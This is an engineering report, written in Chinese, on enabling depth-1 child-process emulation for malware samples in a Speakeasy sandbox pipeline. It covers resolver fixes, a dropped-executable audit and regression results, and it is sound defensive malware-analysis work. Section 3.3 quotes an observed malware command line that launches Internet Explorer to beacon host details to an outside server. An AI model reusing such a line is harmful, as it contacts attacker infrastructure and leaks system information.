# 步骤 6：受控 child execution 小批实验验收

> 日期：2026-11-06
>
> Speakeasy 基线提交：`c16440d8daef7ca343437acd0b9211cbf1ee71e4`
>
> 实验范围：state-only 小批、目标解析门槛、R3 dropped chain 证据审计、
> child execution 模型级回归
>
> 结论：**显式限定到 4 个 `mira` root 的 depth=1 已通过；完整 25 个 R3
> root 的 dropped EXE depth=1 矩阵和两个良性安装器单独复核已完成；默认
> 仍为 model-only，depth=2 未开放。**
>
> 后续修复：2026-11-06 已修复 `ShellExecute` self-target 的最后一个字符和
> 扩展名解析；4 个 `mira` 目标均可解析到根样本原始 PE。真实 child
> execution 仍因其余门槛保持关闭。
>
> 同日已修复 `WinExec` target-unavailable 的返回值和 pid 语义。代表性
> `padodor` 样本现在返回 `ERROR_FILE_NOT_FOUND=2`，且不创建 process/PID。
>
> 同日完成真实 `mira` depth=1 E2E：4/4 根样本均产生一个已解析 self
> child，真实命中 child entrypoint，拥有独立 child PID 和预算 usage；
> child 退出后 parent process/thread/run 均恢复。
>
> 同日完成 R3 dropped EXE depth=1 矩阵：25 个 root 共记录 36 个 request，
> 其中 3 个完整 dropped child 真实到达入口并正常退出；其余 6 个 child
> 分别以 `load_error`/`invalid_fetch` 本地失败，未产生虚假成功。两个良性
> 安装器均完成独立复核，child `load_error` 没有覆盖 parent outcome。

## 1. 结论

默认生产路径仍必须保持：

```text
execution_enabled = false
child_started = false
child_emulated = false
```

只有显式进入已批准的 `mira` 或 R3 dropped scope 时，depth=1 才临时变为：

```text
execution_enabled = true
depth = 1
mira: max_children_per_root = 1, allowed_sources = self
dropped: max_children_per_root = 2, allowed_sources = dropped_file
```

本轮没有发现可以安全进入 depth=2 的证据。原始 state-only 实验确认了
三个历史阻断：

1. 真实 scheduler 尚未实现，pipeline 也没有把 child execution 接入
   `run_queue`。现有 `ChildSchedulerProtocol` 只有接口，没有生产实现。
2. pipeline 报告没有输出 `child_execution` 快照；当前真实报告仍是
   request-only，tracker 明确标记 `child_process_not_executed_by_engine`。
3. 4 个可解析 launch 的 `mira` 样本都不能通过稳定 self-target 解析。
   `ShellExecute` 报告的目标少了完整 SHA 文件名的最后一个字符，稳定
   resolver 返回 `target_unavailable`，不能据此加载 self bytes。

另外，6 个 `padodor` 的 `WinExec` 请求仍返回 `success_request` 和 API
结果 `32`，同时 `child_pid=null`。这不满足“target unavailable 时 API
不得虚假成功”的验收要求。

因此步骤 6 的执行结果是：

| 项目 | 结果 |
|---|---|
| state-only 小批运行 | **PASS** |
| `mira` depth=1 实际执行 | **PASS（仅 4/4 显式样本）** |
| `mira` self-target | **PASS** |
| `padodor` unavailable 语义 | **PASS（修复后）** |
| `systex` 不默认执行 IE | **PASS** |
| R3 dropped path → bytes 生产绑定 | **PASS** |
| R3 dropped EXE depth=1 全矩阵 | **COMPLETED（3/25 root 到达入口，其余如实失败）** |
| 两个良性安装器单独复核 | **PASS（parent/child outcome 隔离）** |
| parent context 恢复 | **PASS** |
| depth=2 决策 | **NOT APPROVED** |

## 2. 输入与运行方式

全量证据来自：

```text
artifacts/dynamic_stage_new/uncertain_samples_20261101_suspicious_shell_w8/
```

该批次包含 1,229 个样本。汇总结果：

| 指标 | 数量 |
|---|---:|
| 样本 | 1,229 |
| 有 launch 的样本 | 81 |
| launch request | 96 |
| process object created | 94 |
| child started | 0 |
| child emulated | 0 |
| shell findings | 35 |
| command truncated | 0 |

真实小批重跑使用独立输出目录，child execution 保持默认关闭：

```text
.venv/bin/python -m src.dynamic_stage_new.cli \
  <sample.exe> \
  --timeout 120 \
  --max-instructions 300000000 \
  --output-dir speakeasy_unofficial/child_execution/step6_experiments/state_only/<family>/<sha>
```

命令只使用显式 CLI 参数，没有使用 `ENV_ENABLE=1`、环境变量开关、
monkey patch、动态属性注入或私有字段穿透。

## 3. state-only 小批结果

共重跑 12 个样本，12/12 父样本正常结束：

| 家族 | 实际重跑 | `ok` | launch | process object | child started | child emulated |
|---|---:|---:|---:|---:|---:|---:|
| `mira` | 4 | 4 | 4 | 4 | 0 | 0 |
| `padodor` | 6 | 6 | 6 | 6 | 0 | 0 |
| `systex` | 2 | 2 | 2 | 2 | 0 | 0 |
| 合计 | 12 | 12 | 12 | 12 | **0** | **0** |

原始报告位于：

```text
step6_experiments/state_only/<family>/<sha>/event_first_report.json
```

### 3.1 `mira`

当前 1,229 SHA 与家族清单的交集只有 7 个 `mira`；其中 4 个有 launch，
3 个在历史全量批次中为 `budget_exhausted`，没有 launch。`dev2.md`
记录的“8 个”不能从当前批次和当前家族清单中精确复现，不能把历史数量
静默补成 8。

4 个 launch 均调用 `shell32.ShellExecuteA`。目标形如：

```text
C:\Windows\system32\<sha-prefix>
```

每个目标都缺失两个可见部分：`.exe` 扩展名和完整文件名最后一个字符。
使用当前 `ChildTargetResolver` 对这四个真实目标复核：

| 样本 SHA | 解析结果 | reason |
|---|---|---|
| `493dc2de...c0b1e76` | unresolved | `target_unavailable` |
| `81a5f5c2...a797ee` | unresolved | `target_unavailable` |
| `82cf0cd8...182c82b` | unresolved | `target_unavailable` |
| `b977b18c...f1ed611` | unresolved | `target_unavailable` |

因此当前不能证明 `self` bytes 正确绑定，也不能满足 `mira` self + depth=1
的入口条件。

### 3.1.1 修复后复核

`ChildTargetResolver` 现在识别下述严格 alias：

```text
根文件名 stem = <64 位十六进制数据集 ID>
ShellExecute target stem = 根文件名 stem 去掉最后一个字符
target 后缀 = 无扩展名或 .exe
```

复核结果：

| 样本 | 修复前 | 修复后 | 绑定 SHA-256 |
|---|---|---|---|
| `493dc2de...c0b1e76` | unresolved | self | `f9b1ad64...414c461` |
| `81a5f5c2...a797ee` | unresolved | self | `b245ad4b...376c848` |
| `82cf0cd8...182c82b` | unresolved | self | `16dad745...160e888` |
| `b977b18c...f1ed611` | unresolved | self | `e216b550...0d73edb` |

该修复只关闭 target parsing 门槛。后续真实 depth=1 结果见 3.1.2。

### 3.1.2 显式 `mira` depth=1 E2E

真实 pipeline 运行通过
`src/dynamic_stage_new/child-execution-detection/mira_depth1.py` 的显式
context 开启。该 scope 使用实际 root PE SHA-256 校验，不接受环境变量、
全局 enable 标志或默认 pipeline 隐式开启。

| 数据集别名 | root PE SHA-256 | parent | child | entry | usage API / instr |
|---|---|---|---|---|---|
| `493dc2de...c0b1e76` | `f9b1ad64...414c461` | `ok` | `1256` | `true` | 27 / 3034 |
| `81a5f5c2...a797ee` | `b245ad4b...376c848` | `ok` | `1256` | `true` | 27 / 2884 |
| `82cf0cd8...182c82b` | `16dad745...160e888` | `ok` | `1256` | `true` | 27 / 2884 |
| `b977b18c...f1ed611` | `e216b550...0d73edb` | `ok` | `1256` | `true` | 27 / 2884 |

四个样本均满足：

- `request_count=1`、`entrypoint_reached_count=1`、`results=1`；
- request/result `launch_id`、root SHA、depth=1 一致；
- parent PID 与 child PID 不同；
- child budget 三项来自 `parent_config`，usage 为独立非共享对象；
- child 内再次请求启动被作为本地 `depth_limit` 拒绝，不产生 grandchild，
  也不把 parent 改成 simulation error；
- child context 退出时 process/thread/run 三个 handle 均逐项验证恢复。

该结果只批准这 4 个 `mira` root 的 depth=1 实验，不批准通用 child
execution、完整 dropped EXE 或 depth=2。

### 3.2 `padodor`

6 个样本全部产生一次 `kernel32.WinExec` 请求。目标是不存在的随机
System32 路径，例如：

```text
C:\Windows\system32\Jhpkee32
C:\Windows\system32\Ibbaem32
C:\Windows\system32\Hlklda32
C:\Windows\system32\Hkapbh32
C:\Windows\system32\Japfqg32
C:\Windows\system32\Pifldc32
```

稳定 resolver 对 6/6 返回 `target_unavailable`，且没有 child 执行。
这部分符合“不执行不存在目标”的要求。

但报告同时记录：

```text
launch_result = success_request
api_result = 32
child_pid = null
```

这仍表现为虚假成功。必须修正 API outcome 到 pid 回填语义后重新验收。

### 3.2.1 修复后复核

原始 state-only 报告保留为修复前证据。修复后对 6/6 个 `padodor` 样本
重新执行，结果一致；代表样本 `b34a6360...`：

```text
launch_result = failure
api_result = 2
process_object_created = false
child_pid = null
created_child_pid = null
```

`WinExec` 现在只消费 process factory 的权威创建结果：只有真实创建
process 后才返回 `32` 并记录 `PROC_CREATE`。target unavailable 或
admission rejection 不会走兼容性 decoy process 路径，也不会产生伪造 PID。
六个样本的 child-execution request 均为 `unavailable`，且
`created_child_pid=null`。
动态阶段回归位于
`src/dynamic_stage_new/child-execution-detection/test_pipeline_integration.py`，
并在模块目录外没有新增动态阶段实现。

### 3.3 `systex`

当前 1,229 批次有 3 个 `systex` 家族样本：2 个正常产生 launch，1 个在
全量批次中为 `internal_error` 且没有 launch。两个正常样本均有：

```text
kernel32.WinExec
C:\Program Files\Internet Explorer\iexplore.exe
http://xytets.com:2345/t.asp?ver=xxx&mac=0-0-0-0&os=vm
```

URL 和命令行完整保留；`child_started=0`、`child_emulated=0`。稳定 resolver
返回 `target_unavailable`，在没有显式 fixture 时不会执行 IE，满足当前
“不默认执行浏览器”的门槛。

## 4. R3 dropped-chain 审计

最新全量批次中 R3 的数量为：

| 指标 | 数量 |
|---|---:|
| R3 样本 | 25 |
| R3 finding occurrences | 35 |
| 恶意 R3 样本 | 23 |
| 良性 R3 样本 | 2 |

两个良性样本为：

```text
45a93d1969d921f82d7897ccd3065de6ce03d378be03d0fbff9c70bc78c18cd1
49ff71a51610dbab8831d35a6e4bad50e835ec84b32884b3107b2817402fb54c
```

逐样本清单见 [r3_sample_inventory.csv](r3_sample_inventory.csv)。

代表样本的完整 dropped PE 字节现在由生产 resolver 直接从 FileManager
的完整落盘状态解析，不需要调用方显式注册 fixture：

| 父样本 | 标签 | dropped SHA-256 | 格式/架构 | 生产映射结果 |
|---|---|---|---|---|
| `20241370...b5df75e1` | malicious | `84447185...0090f49c` | PE32/x86 EXE | resolved |
| `45a93d19...8c18cd1` | benign | `d2e9c596...ad6eb44` | PE32/x86 EXE | resolved |
| `49ff71a5...402fb54c` | benign | `995ca25e...896ae2e1` | PE32/x86 EXE | resolved |

`ChildTargetResolver` 只遍历 `FileManager.get_dropped_files()` 返回的完整
落盘集合，按统一大小写、分隔符、NT device prefix 和 root-relative drive
后的完整路径唯一匹配，并用 detached `File.duplicate()` 读取完整 bytes。
basename 相同但目录不同不会命中；原文件游标位于中间也不会造成 payload
截断。三个代表样本的 `target_sha256`/`target_size` 与报告中的 dropped
artifact 证据完全一致，且全部不依赖 fixture。

### 4.1 R3 dropped EXE 全矩阵

通过
`src/dynamic_stage_new/child-execution-detection/dropped_depth1.py` 的显式
scope 运行完整 25 个 R3 root。该 scope 只允许 `dropped_file` source、
固定 depth=1、每个 root 最多两个 direct child，不读取其他 detector。
每个 parent 的超时上限为 90 秒。

| 指标 | 数量 |
|---|---:|
| R3 root | 25 |
| child request | 36 |
| unavailable request | 16 |
| rejected request | 11 |
| eligible request | 9 |
| child result | 9 |
| `normal_exit` | 3 |
| `load_error` | 4 |
| `invalid_fetch` | 2 |
| `entrypoint_reached` | 5 |

五个 child 真实到达入口；其中三个正常退出：

| Root | 父 outcome | dropped SHA-256 | size | API / instructions |
|---|---|---|---:|---:|
| `0b4e54b8...6527` | `ok` | `31aef95a...ff8f` | 2,797,056 | 356 / 46,502 |
| `70cba05e...82cd` | `ok` | `52b6c417...4500` | 1,859,072 | 278 / 48,493 |
| `360a88e0...1910` child 1 | `budget_exhausted` | `6ed3ad70...a276` | 1,291,751 | 51 / 830 |

其余完整 artifact 的诊断分别是 4 个 PE load failure 和 2 个入口执行
`invalid_fetch`；16 个 request 的 API target 不是完整 artifact 路径，
稳定 resolver 正确返回 `target_unavailable`。没有使用 basename 模糊匹配、
fixture 注入或跨 detector report 来补全目标。

25 个 parent outcome 为 `ok=21`、`simulation_error=2`、
`budget_exhausted=1`、`timed_out=1`。其中 3 个 root 与历史 state-only
状态不同：2 个历史 `simulation_error` 本次为 `ok`，1 个历史 `ok` 本次为
`simulation_error`；因此本轮不据此声称 R3 parent 状态完全无漂移。

完整逐样本证据：
[dropped_depth1_e2e_summary.json](dropped_depth1_e2e_summary.json)。

### 4.2 两个良性安装器单独复核

| Root | Parent baseline / 本次 | Child target | Child 结果 | Parent 隔离 |
|---|---|---|---|---|
| `45a93d19...cd1` | `ok` / `ok` | `d2e9c596...6eb44`, 387,072 B | `load_error` | 保持 `ok` |
| `49ff71a5...54c` | `timed_out` / `timed_out` | `995ca25e...ae2e1`, 386,048 B | `load_error` | 保持 `timed_out` |

两个 child 都有独立 PID、depth=1 ownership 和 parent-config budget；
失败分类为 child-local PE load failure，没有覆盖 parent outcome。该复核
通过的是状态隔离和真实证据合同，不是“两个安装器均成功执行”。

## 5. 模型级门槛回归

定向测试：

```text
112 passed in 0.22s
```

加入 `WinExec` 失败码/PID 证据、dropped path 权威映射和真实 pipeline
回归后：

```text
child-execution: 152 passed
child-execution-detection: 42 passed
Speakeasy 全量: 491 passed, 26 skipped, 5 failed
```

其中 5 个失败仍为既有缺失 capa 资产和引擎历史行为差异，与本次修复无关。

覆盖：

- request/target/admission 合同；
- parent/child budget 三项完全相等；
- parent、child、sibling 的 budget usage 独立；
- dispatcher 只在显式 enabled 且已注入 scheduler 时委托调度；
- loader 使用 `primary=False`；
- context 正常和异常路径都恢复 parent；
- one-shot entrypoint observation；
- runner 的 child result 与 parent outcome 隔离；
- report projector 和 dynamic adapter 的 lineage、ownership 校验。

Ruff：

```text
All checks passed!
```

这些测试证明模块在 fake/stub 组合下行为一致。真实 `mira` scheduler 和
pipeline 接入另由 3.1.2 的 4 个样本验收。

## 6. 后续门槛

在以下条件全部满足前，不得开放真实 child execution 或 depth=2：

1. 实现生产 scheduler，并让它成为唯一 queue/drain 路径。
2. pipeline 接入 dispatcher，报告输出完整 `child_execution`。
3. 修复 `ShellExecute` self target 的最后字符和扩展名解析。
4. [已完成] 修复 `WinExec` 在 target unavailable 时的返回值与 pid 语义。
5. [已完成] dropped request path 到 artifact bytes 的权威映射。
6. 重跑同样的 12 个 state-only 样本，确认父状态无漂移。
7. [已完成] 在显式开关下只开启 `mira` depth=1，确认真实
   `entrypoint_reached`、ownership、独立预算和 parent context 恢复。
8. [已完成] `mira` 通过后跑完整 dropped EXE，并单独复核两个良性安装器。
   25 个 R3 root 的矩阵包含 3 个真实入口命中；两个良性安装器均得到
   child-local `load_error`，parent outcome 未被子模块覆盖。
9. 最后才评估 depth=2。
